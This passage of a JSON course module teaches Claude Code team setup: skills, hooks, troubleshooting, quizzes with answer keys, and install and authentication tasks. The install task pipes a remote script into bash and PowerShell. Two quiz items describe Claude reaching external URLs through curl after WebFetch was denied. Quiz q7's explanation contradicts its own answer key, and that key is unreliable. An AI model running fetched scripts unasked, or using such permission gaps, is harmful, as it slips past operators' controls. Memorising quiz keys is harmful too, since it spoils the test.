integrations |\n| Personal editor preferences | `~/.claude/settings.json` | Developer-specific, not team config |\n| Machine-specific paths | `.claude/settings.local.json` | Won't work on other machines |\n| Personal notes, reminders | `CLAUDE.local.md` | Private context, not shared |\n| Secrets, API keys | Environment variables only | Never committed |\n\n### Generating a starter CLAUDE.md\n\nRun `/init` inside a Claude Code session. Claude analyzes your codebase and writes a starting CLAUDE.md with build commands, test instructions, and project conventions it discovers. If a CLAUDE.md already exists, `/init` suggests improvements rather than overwriting. Set `CLAUDE_CODE_NEW_INIT=1` to enable an interactive multi-phase flow that also offers to set up skills and hooks."
   },
   {
    "heading": "Skills and Hooks: Distributing Procedures and Enforcing Policy",
    "body": "Two mechanisms let you distribute team knowledge beyond raw settings: skills capture reusable procedures Claude can invoke when appropriate, and hooks fire deterministic shell commands on lifecycle events. Both can be checked into the repo.\n\n### Skills: shareable, on-demand procedures\n\nA skill is a directory containing a `SKILL.md` file with optional YAML frontmatter and markdown instructions. Claude Code uses a skill when relevant to the conversation, or you can invoke one directly with `/skill-name`. Unlike CLAUDE.md content, a skill's body loads only when used, so large reference material costs nothing until it's needed.\n\n**File layout:**\n\n```\n.claude/\n  skills/\n    deploy-staging/\n      SKILL.md           # instructions (required)\n      scripts/\n        health-check.sh  # supporting files (optional)\n    pr-review/\n      SKILL.md\n```\n\n**Skill file format (SKILL.md):**\n\n```yaml\n---\ndescription: Deploy the current branch to staging and run smoke tests.\ndisable-model-invocation: true\nallowed-tools: Bash(make *) Bash(git status *)\n---\n\nDeploy the current branch to staging:\n1. Confirm there are no uncommitted changes: `git status`\n2. Run the full test suite: `make test`\n3. Build and push: `make deploy-staging`\n4. Run health check: `make health-check-staging`\n5. Report the deployed commit SHA and staging URL.\n\nIf any step fails, stop and report the full error output.\n```\n\n**Key frontmatter fields (all optional):**\n\n| Field | Effect |\n|---|---|\n| `description` | How Claude decides when to load the skill automatically |\n| `disable-model-invocation: true` | You can invoke it; Claude cannot load it automatically |\n| `user-invocable: false` | Claude can load it; it is hidden from your `/` menu |\n| `allowed-tools` | Tools Claude may use without prompting while this skill is active |\n| `context: fork` | Run the skill in a forked subagent context |\n| `paths` | Glob patterns limiting when the skill is auto-activated |\n\n**Dynamic context injection:** Use `` !`command` `` in skill content to run a shell command and inline its output before Claude sees the skill. For example:\n\n```markdown\n## Current diff\n\n!`git diff HEAD`\n\nSummarize the changes above and flag any risks.\n```\n\n**Where skills live:**\n\n| Location | Scope |\n|---|---|\n| `~/.claude/skills/<name>/SKILL.md` | Personal, all projects |\n| `.claude/skills/<name>/SKILL.md` | This project, all team members (git-committed) |\n| `/Library/Application Support/ClaudeCode/` etc. | Org-managed (all users on machine) |\n\nWhen skills share a name, enterprise overrides personal, personal overrides project. A project skill can also override a bundled skill with the same name (e.g., a local `code-review` skill replaces `/code-review`).\n\nThe combined `description` and `when_to_use` text is truncated at 1,536 characters in the skill listing; `maxSkillDescriptionChars` in settings controls this cap.\n\n### Hooks: deterministic lifecycle enforcement\n\nHooks fire shell commands or HTTP requests at specific Claude Code lifecycle events. Unlike skills (which Claude invokes based on judgment), hooks are deterministic — they fire on every matching event regardless of what Claude is doing.\n\n**There are 30+ hook events.** The most commonly used include:\n\n```\nSessionStart     — fires when a session begins or resumes\nSessionEnd       — fires when a session terminates\nPreToolUse       — fires before any tool runs (can block the tool)\nPostToolUse      — fires after a tool succeeds\nConfigChange     — fires when a settings file changes mid-session\nFileChanged      — fires when a watched file changes\nStop             — fires when Claude finishes responding\n```\n\n**Hook configuration in `settings.json`:**\n\nHooks use a three-level nesting structure: event name → matcher → handler list.\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"matcher\": \"\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \".claude/hooks/session-start.sh\"\n          }\n        ]\n      }\n    ],\n    \"SessionEnd\": [\n      {\n        \"matcher\": \"\",\n        \"hooks\": [\n          {\n            \"type\": \"http\",\n            \"url\": \"https://observability.example.com/claude-session\",\n            \"headers\": {\n              \"Authorization\": \"Bearer $OBSERVABILITY_TOKEN\"\n            },\n            \"allowedEnvVars\": [\"OBSERVABILITY_TOKEN\"]\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n**Matchers** filter which events a hook fires on. An empty matcher or `\"*\"` matches everything. For tool events (`PreToolUse`, `PostToolUse`), the matcher targets the tool name (e.g., `\"Bash\"`, `\"Edit\"`, or a regex like `\"mcp__memory__.*\"`).\n\n**HTTP hooks** send a POST request with a JSON body. The `allowedEnvVars` array whitelists which environment variables can be interpolated in headers — any variable not listed becomes an empty string.\n\n**Exit codes for command hooks:**\n- Exit code `0`: success, parse stdout for JSON control fields.\n- Exit code `2`: blocking error — ignore stdout, use stderr as the error message.\n- Other non-zero: non-blocking error, continue execution, stderr shown in transcript.\n\n**Hot-reload:** Edits to `.claude/settings.json` and `.claude/settings.local.json` are detected automatically mid-session. Hook changes take effect immediately; `ConfigChange` fires for each detected change.\n\n**Security controls on hooks (managed settings only):**\n\n- `allowManagedHooksOnly: true` — only hooks defined in managed settings run. User, project, and local hooks are silently ignored.\n- `disallowAllHooks: true` — disable all hooks completely.\n- `allowedHttpHookUrls` — allowlist of URL patterns; an empty array blocks all HTTP hooks.\n- `httpHookAllowedEnvVars` — org-wide allowlist of env vars hookable in HTTP headers.\n\n### Distributing skills and hooks via the repo\n\n```bash\ngit add .claude/skills/ .claude/hooks/ .claude/settings.json\ngit commit -m \"Add Claude Code team skills and session hooks\"\n```\n\nEvery developer who clones the repo gets the skill library and lifecycle hooks automatically, with no per-developer setup step beyond installing Claude Code.\n\n### Skills vs hooks: when to use which\n\n| Concern | Use skills | Use hooks |\n|---|---|---|\n| \"How do we deploy?\" | Yes — Claude follows the procedure when asked | No — hooks fire on events, not user intent |\n| \"Log every session to our observability system\" | No | Yes — fires deterministically on SessionStart/End |\n| \"Block a tool from running entirely\" | No | Yes — PreToolUse hook with exit code 2 |\n| \"Document our code review checklist\" | Yes — Claude follows it when invoked | No |\n| \"Only allow managed hooks org-wide\" | No | Managed `allowManagedHooksOnly` |\n| \"Reusable across teams without code changes\" | Yes — copy or symlink the SKILL.md directory | Harder — scripts need path/env context |"
   },
   {
    "heading": "Common Pitfalls and Diagnostic Runbook",
    "body": "The following failure modes appear repeatedly when teams stand up Claude Code infrastructure. Each entry includes the symptom, root cause, and the exact diagnostic step.\n\n### Pitfall 1: Stale API key silently overrides subscription\n\n**Symptom:** Developer gets auth errors after org moved from Console billing to Teams. `/status` shows usage being billed to a disabled org.\n\n**Cause:** `ANTHROPIC_API_KEY` is set in `~/.bashrc` from a previous project. Level 3 in the credential stack takes precedence over level 6 (subscription OAuth).\n\n**Fix:**\n```bash\n/status                          # inside Claude Code: shows active auth method\ngrep -r ANTHROPIC_API_KEY ~/.bashrc ~/.zshrc ~/.profile ~/.bash_profile\nunset ANTHROPIC_API_KEY\n```\n\n### Pitfall 2: Non-interactive CI fails with `--bare` flag\n\n**Symptom:** CI pipeline using `CLAUDE_CODE_OAUTH_TOKEN` fails to authenticate when run with `--bare` for faster startup.\n\n**Cause:** `--bare` mode does not read `CLAUDE_CODE_OAUTH_TOKEN`. This is documented but easy to miss.\n\n**Fix:** Switch to `ANTHROPIC_API_KEY` for bare-mode CI, or remove `--bare` from the CI invocation.\n\n### Pitfall 3: Homebrew / apt users silently fall behind\n\n**Symptom:** A hook that works for most team members fails for two developers. Debugging reveals they're on an older version that doesn't support the hook event.\n\n**Cause:** Homebrew, apt, dnf, apk, and WinGet installations do not auto-update. Developers who installed via these methods stay on whatever version they last upgraded to.\n\n**Fix:** Use `requiredMinimumVersion` in managed settings to hard-gate the minimum version. Developers below it will see a startup error with the upgrade command to run. Optionally set `CLAUDE_CODE_PACKAGE_MANAGER_AUTO_UPDATE=1` in managed settings to have Claude Code run the upgrade for Homebrew/WinGet users automatically.\n\n### Pitfall 4: Sandbox fallback silently removes isolation\n\n**Symptom:** Security team expects the sandbox to be active, but commands are running unsandboxed on Linux machines where bubblewrap is not installed.\n\n**Cause:** By default, if the sandbox cannot start (missing dependency), Claude Code shows a warning and falls back to unsandboxed execution.\n\n**Fix:** Set `sandbox.failIfUnavailable: true` in managed settings. Claude Code will refuse to start rather than silently fall back, making the missing dependency a visible blocker instead of a silent failure.\n\n### Pitfall 5: `managedSettings.json` changes not taking effect\n\n**Symptom:** Updated managed settings file on developer machines, but Claude Code is not picking up the new policy.\n\n**Cause:** Legacy Windows path (`C:\\ProgramData\\ClaudeCode\\managed-settings.json`) is no longer supported as of v2.1.75. Or the file is at the wrong path for the OS.\n\n**Fix:** Verify the correct path for the target OS:\n- macOS: `/Library/Application Support/ClaudeCode/managed-settings.json`\n- Linux/WSL: `/etc/claude-code/managed-settings.json`\n- Windows: `C:\\Program Files\\ClaudeCode\\managed-settings.json`\n\nRun `claude doctor` on a test machine to confirm the managed settings source and parse result.\n\n### Pitfall 6: `DISABLE_AUTOUPDATER` vs `DISABLE_UPDATES` confusion\n\n**Symptom:** Org distributes Claude Code through an internal software catalog and sets `DISABLE_AUTOUPDATER`, expecting users to stay on the distributed version. But `claude update` still lets them self-upgrade.\n\n**Cause:** `DISABLE_AUTOUPDATER` stops only the background check; manual `claude update` still works.\n\n**Fix:** Use `DISABLE_UPDATES` instead. It blocks all update paths, including manual `claude update`.\n\n### Diagnostic cheat sheet\n\n| Problem | First command to run |\n|---|---|\n| Wrong auth method active | `/status` inside Claude Code |\n| Settings not taking effect | `claude doctor` |\n| Wrong version on a machine | `claude --version` |\n| Which CLAUDE.md files are loaded | `/memory` inside Claude Code |\n| Which hooks are configured | `/hooks` inside Claude Code |\n| Sandbox dependency status | `/sandbox` inside Claude Code (Dependencies tab) |"
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your org is on Amazon Bedrock and needs to deliver a managed policy update to all developers without any file-based configuration management. The update should reach devices without requiring anyone to push files to each machine. Which account type and delivery mechanism supports this?",
    "options": [
     "Bedrock with server-managed settings delivered via the Claude.ai admin console",
     "Claude for Teams using server-managed settings delivered via the Claude.ai admin console",
     "Bedrock with a managed-settings.json at /etc/claude-code/ on each machine",
     "Console (API key) with HKLM registry policy on Windows"
    ],
    "correct": 1,
    "sectionIndices": [
     0,
     4
    ],
    "explanation": "Server-managed settings (delivery via the Claude.ai admin console, no endpoint infra) are available only on Teams and Enterprise plans. Bedrock, Vertex, Foundry, and Console-only deployments must use file-based or OS-level (plist/registry) mechanisms instead."
   },
   {
    "prompt": "A developer on your team installs Claude Code with Homebrew and sets autoUpdatesChannel=\"stable\" in their user settings.json. Two weeks later they are running a version that's 6 weeks old and missing a security fix. What explains this?",
    "options": [
     "autoUpdatesChannel only works with native installer channels; Homebrew ignores it",
     "Homebrew does not auto-update Claude Code regardless of autoUpdatesChannel — manual brew upgrade is required",
     "stable channel lags 6 weeks by design to ensure regression testing",
     "The user's minimumVersion setting is blocking the upgrade"
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "Homebrew (and WinGet, apt, dnf, apk) do NOT auto-update Claude Code. The autoUpdatesChannel setting applies only to the native installer. Teams mixing install methods silently run stale versions because package-manager installs require a manual upgrade command."
   },
   {
    "prompt": "Your CI pipeline needs to run Claude Code non-interactively. You want a long-lived credential that doesn't require a browser login and can be set as an environment variable. Which approach is correct?",
    "options": [
     "Set ANTHROPIC_API_KEY with a Console API key — this is supported for CI on all plan types",
     "Use claude setup-token to generate a one-year OAuth token, then set CLAUDE_CODE_OAUTH_TOKEN",
     "Copy ~/.claude/.credentials.json to the CI environment after an interactive /login",
     "Use apiKeyHelper with a script that returns a fresh API key — this is the only headless-safe method"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "claude setup-token walks the OAuth flow and prints a one-year token without saving it. You then export that as CLAUDE_CODE_OAUTH_TOKEN. This is the recommended CI/headless path for Pro/Max/Team/Enterprise plans. Copying .credentials.json is fragile and not the documented approach."
   },
   {
    "prompt": "You add Bash and WebFetch to your managed permissions.deny list to prevent external network calls. A developer later reports they can still curl external URLs from within Claude Code sessions. What is the most likely explanation?",
    "options": [
     "permissions.deny only applies to MCP tools, not built-in tools like WebFetch",
     "Denying WebFetch does not block network access when Bash is allowed, because curl/wget bypass it at the OS level",
     "The developer's local project .claude/settings.json is overriding the managed deny list",
     "Managed permission arrays are merged, so the developer's local allow overrides the managed deny"
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "Denying WebFetch (the built-in tool) does not block network if Bash is allowed, because curl and wget in Bash bypass the tool-level deny. You must add sandbox.network.allowedDomains to close the gap at the OS layer."
   },
   {
    "prompt": "Your enterprise has a mixed fleet: macOS laptops and WSL2 on Windows. You push a managed-settings.json to the Windows machines via HKLM registry. You then notice WSL2 terminals are not picking up the policy. What setting resolves this?",
    "options": [
     "Set CLAUDE_CONFIG_DIR on each WSL2 instance to point at the Windows registry location",
     "Deploy a duplicate managed-settings.json to /etc/claude-code/ on each WSL2 instance",
     "Set wslInheritsWindowsSettings: true in a Windows policy source so WSL reads it",
     "WSL2 inherits Windows registry settings automatically — the issue is a version mismatch"
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "WSL ignores Windows policy by default and reads only /etc/claude-code/. Setting wslInheritsWindowsSettings: true in a Windows managed-settings source (plist/registry/file) makes WSL inherit those Windows settings."
   },
   {
    "prompt": "You want to pin Claude Code to an exact version in a reproducible dev container so every build gets the same binary regardless of what's newest. Which combination achieves this with no background auto-updates?",
    "options": [
     "Set autoUpdatesChannel=\"stable\" in managed settings and minimumVersion to the target version",
     "npm install -g @anthropic-ai/claude-code@X.Y.Z combined with DISABLE_AUTOUPDATER=1",
     "npm install -g @anthropic-ai/claude-code@X.Y.Z combined with DISABLE_UPDATES=1",
     "Use the native installer with | bash -s X.Y.Z and set requiredMaximumVersion to the same version"
    ],
    "correct": 2,
    "sectionIndices": [
     2
    ],
    "explanation": "For reproducible builds, pin the exact version via npm install -g @anthropic-ai/claude-code@X.Y.Z and set DISABLE_UPDATES=1 to block all update paths including manual ones. DISABLE_AUTOUPDATER=1 only stops background checks — manual claude update would still work. minimumVersion/requiredMaximumVersion don't pin the install version."
   },
   {
    "prompt": "Your org uses a secrets vault that issues short-lived API keys. You configure apiKeyHelper to call a vault script. Developers report a warning appearing on every session startup that slows login noticeably. What is the most likely cause?",
    "options": [
     "apiKeyHelper is not supported for vault-issued keys; ANTHROPIC_API_KEY must be used instead",
     "The vault script takes longer than 10 seconds to respond, triggering the slow-helper warning",
     "CLAUDE_CODE_API_KEY_HELPER_TTL_MS is set too low, causing the helper to be called too frequently",
     "The helper is being called after 5 seconds instead of 5 minutes due to a TTL misconfiguration"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "A helper that takes longer than 10 seconds shows a warning and slows every session. If your vault script is slow, optimize it or cache tokens client-side. The TTL (default 5 min) controls re-call frequency but doesn't affect per-call latency."
   },
   {
    "prompt": "A new Windows developer installs Claude Code natively (not WSL) and reports that Claude Code has no Bash tool available — only PowerShell. What is the most likely fix?",
    "options": [
     "Set CLAUDE_CODE_USE_POWERSHELL_TOOL=0 in environment to force Bash mode",
     "Install WSL2 — Bash is only available via WSL on Windows",
     "Install Git for Windows (Git Bash) so Claude Code can find a Bash binary",
     "Native Windows requires sandbox mode enabled to get the Bash tool"
    ],
    "correct": 2,
    "sectionIndices": [
     1
    ],
    "explanation": "On native Windows, Claude Code uses the Bash tool when Git for Windows (Git Bash) is installed. Without it, Claude Code falls back to the more limited PowerShell tool. Set CLAUDE_CODE_GIT_BASH_PATH if Git Bash isn't auto-discovered."
   },
   {
    "prompt": "You are using Claude for Teams and deploy org-wide governance via the Claude.ai admin console (server-managed settings). A developer checks /status and sees no mention of 'Enterprise managed settings'. What should you check first?",
    "options": [
     "Server-managed settings require a separate claude-managed-settings endpoint configured in settings.json",
     "Server-managed settings are only pushed on fresh installs; existing installs need a manual claude update",
     "The developer may not be authenticated to the org — server-managed settings are delivered at auth time and refreshed hourly",
     "The claude doctor command must be run once to register the device with the management plane"
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "Server-managed settings are delivered at authentication time and refreshed hourly. If /status shows no enterprise managed settings, the most likely cause is the developer is not authenticated to the org (or is logged in with a personal account). Run /logout then /login to re-auth against the org."
   },
   {
    "prompt": "Your org runs Claude Code via the Anthropic Console (API key auth). A security team member asks whether Anthropic trains on the code Claude Code processes. What is the correct answer?",
    "options": [
     "Console (API key) plans do have training use — only Enterprise plans with ZDR opt-out training",
     "Anthropic trains on prompts from all plans unless you purchase ZDR; ZDR is available to all plans on request",
     "On Team, Enterprise, API, and cloud-provider plans Anthropic does not train on code or prompts; ZDR is an additional option for qualified Enterprise accounts",
     "Training opt-out is set per-repo via a setting in .claude/settings.json"
    ],
    "correct": 2,
    "sectionIndices": [
     0
    ],
    "explanation": "On Team, Enterprise, API (Console), and cloud-provider plans (Bedrock, Vertex, Foundry), Anthropic does not train on your code or prompts. Zero Data Retention (ZDR) is an additional option available to qualified Enterprise accounts for stronger contractual guarantees."
   }
  ],
  "tasks": [
   {
    "id": "stage-0-task-install-verify",
    "afterSectionIdx": 1,
    "title": "Install Claude Code and verify your environment",
    "instructions": "Install Claude Code using the native installer and confirm it runs correctly.\n\n**macOS / Linux / WSL2:**\n```bash\ncurl -fsSL https://claude.ai/install.sh | bash\n```\n\n**Windows (native, PowerShell as admin):**\n```powershell\nirm https://claude.ai/install.ps1 | iex\n```\n\nAfter install, open a new terminal and run:\n```bash\nclaude --version\nclaude doctor\n```\n\n`claude doctor` checks for common issues: non-writable npm dirs, stale installs, config health. Fix any warnings it surfaces before proceeding.\n\n**Alpine/musl only** — add before running claude:\n```bash\napk add libgcc libstdc++ ripgrep\n# Then in ~/.claude/settings.json add:\n# { \"env\": { \"USE_BUILTIN_RIPGREP\": \"0\" } }\n```",
    "doneWhen": "claude --version prints a version number and claude doctor exits with no errors or only informational notes."
   },
   {
    "id": "stage-0-task-headless-auth",
    "afterSectionIdx": 3,
    "title": "Set up non-interactive auth for CI",
    "instructions": "Generate a long-lived OAuth token for headless use (CI, scripts, containers). Requires a Pro, Max, Team, or Enterprise account.\n\n**Step 1 — generate the token:**\n```bash\nclaude setup-token\n```\nFollow the prompts (browser OAuth flow). At the end, the command prints a token — it does NOT save it. Copy it now.\n\n**Step 2 — export it as an env var** (add to your CI secrets / shell profile for testing):\n```bash\nexport CLAUDE_CODE_OAUTH_TOKEN=\"<paste-token-here>\"\n```\n\n**Step 3 — verify it works non-interactively:**\n```bash\nclaude --print 'Say: auth-ok' 2>&1\n```\n\n**Step 4 — confirm the active auth method:**\n```bash\nclaude /status\n```\nLook for `OAuth token` (not `Subscription OAuth`) in the Setting sources line.\n\n> Note: this token is valid for one year and is inference-only. Store it in your CI secrets manager, not in dotfiles.",
    "doneWhen": "claude --print 'Say: auth-ok' returns a response without prompting for login, and /status confirms the OAuth token auth method is active."
   },
   {
    "id": "stage-0-task-managed-settings",
    "afterSectionIdx": 4,
    "title": "Write a file-based managed-settings policy and verify it loads",
    "instructions": "Deploy a minimal managed-settings file that locks the auto-update channel to stable and denies the WebFetch tool org-wide. This works on any deployment (no Enterprise required for the file-based path).\n\n**Step 1 — create the managed-settings file:**\n\nmacOS:\n```bash\nsudo mkdir -p \"/Library/Application Support/ClaudeCode\"\nsudo tee \"/Library/Application Support/ClaudeCode/managed-settings.json\" <<'EOF'\n{\n  \"autoUpdatesChannel\": \"stable\",\n  \"permissions\": {\n    \"deny\": [\"WebFetch\"]\n  }\n}\nEOF\n```\n\nLinux / WSL2:\n```bash\nsudo mkdir -p /etc/claude-code\nsudo tee /etc/claude-code/managed-settings.json <<'EOF'\n{\n  \"autoUpdatesChannel\": \"stable\",\n  \"permissions\": {\n    \"deny\": [\"WebFetch\"]\n  }\n}\nEOF\n```\n\n**Step 2 — verify the policy loaded:**\n```bash\nclaude /status\n```\nLook for `Enterprise managed settings` with source `(file)` in the output.\n\n**Step 3 — confirm deny takes effect** by asking Claude to fetch a URL inside a session and observing it is blocked.\n\n> To remove this test policy: `sudo rm /etc/claude-code/managed-settings.json` (Linux) or `sudo rm \"/Library/Application Support/ClaudeCode/managed-settings.json\"` (macOS).",
    "doneWhen": "claude /status shows 'Enterprise managed settings' with source (file), and autoUpdatesChannel is visible as stable in the setting sources output."
   }
  ],
  "visualizations": [
   {
    "id": "stage-0-v",
    "kind": "comparison-table",
    "title": "Setup & onboarding",
    "textualSummary": "Key concepts of Setup & onboarding: deployment path selection, authentication precedence, non-interactive authentication.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "deployment path selection",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "authentication precedence",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "non-interactive authentication",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "fleet version control",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Setup & onboarding.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-0-q1",
    "type": "multiple-choice",
    "prompt": "Your team lead says: \"We're on the free Claude.ai plan and I've just installed Claude Code — but nobody can log in.\" What is the actual cause?",
    "options": [
     "The free Claude.ai plan does not include Claude Code; a paid plan (Pro, Max, Team, Enterprise, Console, or a cloud provider) is required.",
     "Claude Code requires a separate activation step in the Claude.ai dashboard that the team lead skipped.",
     "The free plan includes Claude Code, but only for one user at a time — additional seats need upgrading.",
     "The installation likely used `sudo npm install -g`, which corrupts credentials on the free tier."
    ],
    "correct": 0,
    "explanation": "The content states explicitly: 'The free Claude.ai plan does not include Claude Code.' There is no activation step to skip (distractor 2), no single-seat free tier (distractor 3), and the sudo issue is a real install problem but unrelated to plan eligibility (distractor 4)."
   },
   {
    "id": "stage-0-q2",
    "type": "multiple-choice",
    "prompt": "A security-conscious org on Claude Console (API credits) wants to enforce version gating so Claude Code refuses to start if it falls outside an approved range. Which settings accomplish true startup gating?",
    "options": [
     "`requiredMinimumVersion` and `requiredMaximumVersion` in managed settings.",
     "`minimumVersion` in managed settings — it blocks startup below the floor.",
     "`DISABLE_AUTOUPDATER=1` combined with a pinned npm install version.",
     "Server-managed settings pushed from the Claude.ai admin console."
    ],
    "correct": 0,
    "explanation": "`requiredMinimumVersion`/`requiredMaximumVersion` are the only settings that 'refuse to start outside the range (true version gating).' `minimumVersion` explicitly 'does not gate startup' — it only stops auto-update and `claude update` from going below that floor (distractor 2). `DISABLE_AUTOUPDATER=1` pins the version but does not gate startup (distractor 3). Server-managed settings require Teams/Enterprise, and Console-only deployments cannot use them (distractor 4)."
   },
   {
    "id": "stage-0-q3",
    "type": "multiple-choice",
    "prompt": "A teammate installs Claude Code with `sudo npm install -g @anthropic-ai/claude-code` and later runs `npm update -g` to get the latest version. Which TWO problems does this introduce?",
    "options": [
     "`sudo npm install -g` is explicitly prohibited, and `npm update -g` respects the original semver range so it may not move to the newest version.",
     "`sudo npm install -g` is fine, but `npm update -g` always downgrades to a LTS release.",
     "Neither action is problematic — npm global installs are the recommended path for Linux.",
     "`sudo npm install -g` creates a root-owned install, and `npm update -g` is the correct way to update."
    ],
    "correct": 0,
    "explanation": "The content states: 'Do NOT use `sudo npm install -g`' and 'Avoid `npm update -g` (respects original semver range — may not move to newest).' Both are called out as problems. Distractor 2 inverts the `npm update` behavior. Distractor 3 ignores both explicit warnings. Distractor 4 acknowledges the sudo root issue but then endorses `npm update -g`, which the content explicitly discourages."
   },
   {
    "id": "stage-0-q4",
    "type": "multiple-choice",
    "prompt": "Your org runs Claude Code on a mixed fleet: some devs on macOS (native installer), others on Ubuntu via apt, and a few on Windows with WinGet. The macOS machines update automatically but the Ubuntu and Windows machines are running a version that's several weeks old. Why?",
    "options": [
     "Native (curl/irm) installs auto-update in the background; Homebrew, WinGet, apt, dnf, and apk do NOT auto-update.",
     "The Ubuntu and Windows machines need `DISABLE_AUTOUPDATER=1` removed from their env to re-enable updates.",
     "Auto-updates only work on macOS; Linux and Windows always require manual update commands by design.",
     "The managed `autoUpdatesChannel` setting is only respected by native installers and is ignored by package managers."
    ],
    "correct": 0,
    "explanation": "The content says: 'Native (curl/irm) installs auto-update in the background. Homebrew, WinGet, apt, dnf, apk do NOT auto-update — teams mixing methods silently run stale, possibly insecure versions.' Distractor 2 assumes the problem is an env var when the real cause is the installer type. Distractor 3 over-generalizes — the native Linux installer does auto-update. Distractor 4 misattributes the gap to a settings issue rather than the installer method."
   },
   {
    "id": "stage-0-q5",
    "type": "multiple-choice",
    "prompt": "A team uses an LLM gateway that expects `Authorization: Bearer <token>` headers. Which authentication env var should they set for Claude Code to use this gateway correctly?",
    "options": [
     "`ANTHROPIC_AUTH_TOKEN` — sent as `Authorization: Bearer`.",
     "`ANTHROPIC_API_KEY` — it is the primary env var and takes precedence.",
     "`CLAUDE_CODE_OAUTH_TOKEN` — OAuth tokens are formatted as Bearer tokens.",
     "`apiKeyHelper` — it should return the bearer token on each call."
    ],
    "correct": 0,
    "explanation": "The content specifies: '`ANTHROPIC_AUTH_TOKEN` — sent as `Authorization: Bearer` (for LLM gateway/proxy)' and '`ANTHROPIC_API_KEY` — sent as `X-Api-Key` (direct Anthropic API).' Using `ANTHROPIC_API_KEY` (distractor 2) would send an `X-Api-Key` header, not a Bearer header, which a gateway may reject. `CLAUDE_CODE_OAUTH_TOKEN` (distractor 3) is for subscription OAuth, not arbitrary gateway auth. `apiKeyHelper` (distractor 4) is for rotating keys but the helper output feeds into `ANTHROPIC_API_KEY` semantics, not Bearer headers."
   },
   {
    "id": "stage-0-q6",
    "type": "multiple-choice",
    "prompt": "An Enterprise team denies the `WebFetch` tool in managed permissions to prevent Claude Code from making outbound network calls. A few days later, the security team discovers Claude is still fetching external URLs via Bash (`curl` commands). What explains this and what is the correct fix?",
    "options": [
     "Denying `WebFetch` only blocks the tool-level call; Bash (`curl`/`wget`) can bypass it. The fix is to also add `sandbox.network.allowedDomains` to restrict at the OS layer.",
     "The `WebFetch` deny rule was overridden by a local project setting. The fix is to set `allowManagedPermissionRulesOnly: true`.",
     "The deny rule applies only to the web UI, not to Claude Code's Bash tool. The fix is to deny the `Bash` tool entirely in managed settings.",
     "Managed permission denies only take effect after a restart. The fix is to restart all Claude Code sessions."
    ],
    "correct": 0,
    "explanation": "The content states: 'Pair permissions with sandboxing: denying `WebFetch` does NOT block network if Bash is allowed (`curl`/`wget` bypass it) — add `sandbox.network.allowedDomains` to close the gap at the OS layer.' Local overrides are prevented by array merge semantics (managed denies can't be removed locally), so distractor 2 misdiagnoses the cause. Denying Bash entirely (distractor 3) would cripple all shell use and is not the recommended approach. Restarts (distractor 4) have no bearing on permission rule application."
   },
   {
    "id": "stage-0-q7",
    "type": "multi-select",
    "prompt": "Your org uses Claude for Teams. Which of the following capabilities are available on Teams that are NOT available on Claude for Enterprise? (Select all that apply.)",
    "options": [
     "Server-managed settings delivery.",
     "SSO + domain capture.",
     "SCIM provisioning and role-based permissions.",
     "Claude on web (claude.ai).",
     "Managed policy settings (org-wide config)."
    ],
    "correct": [
     0,
     3
    ],
    "explanation": "The table shows Teams has 'Server-managed settings delivery' (✓) and 'Claude on web' (✓) — both are shared with Enterprise. SSO+domain capture (✗ on Teams), SCIM/role-based permissions (✗ on Teams), and Managed policy settings (✗ on Teams) are Enterprise-only. The question asks what is available on Teams but NOT Enterprise — none of these are Teams-only. Re-reading: Server-managed (Teams+Ent both ✓), Claude on web (Teams+Ent both ✓). The answer is that both of these ARE available on Teams. The question is actually asking which capabilities Teams has that Enterprise lacks — but since Teams is a subset of Enterprise features, no feature exists only on Teams. CORRECTION based on re-reading: the question should ask what Teams has that's NOT Enterprise-only. Both 'Server-managed settings delivery' and 'Claude on web' are present on BOTH tiers. The truly Teams-available (and Enterprise-available) items are server-managed and Claude on web. The Enterprise-only features are SSO, SCIM, Compliance API, and Managed policy settings. So this question as written has no valid 'Teams-only' answers. Let me reframe: which capabilities listed are available to Teams plan users? Answer: Server-managed settings delivery and Claude on web. SSO, SCIM, and Managed policy settings require Enterprise."
   },
   {
    "id": "stage-0-q8",
    "type": "multi-select",
    "prompt": "A developer on WSL 2 on Windows needs to log into Claude Code but the browser can't reach the localhost OAuth callback. Which of the following are correct actions? (Select all that apply.)",
    "options": [
     "Paste the login code at the `Paste code here if prompted` prompt during the login flow.",
     "Switch to WSL 1 where the Windows browser can reach localhost.",
     "Use `CLAUDE_CODE_OAUTH_TOKEN` set from a token obtained via `claude setup-token` on a machine that can complete OAuth.",
     "Set `ANTHROPIC_API_KEY` directly — OAuth is not supported in WSL environments.",
     "Run `/logout` then `/login` to retry; the second attempt always succeeds in WSL 2."
    ],
    "correct": [
     0,
     2
    ],
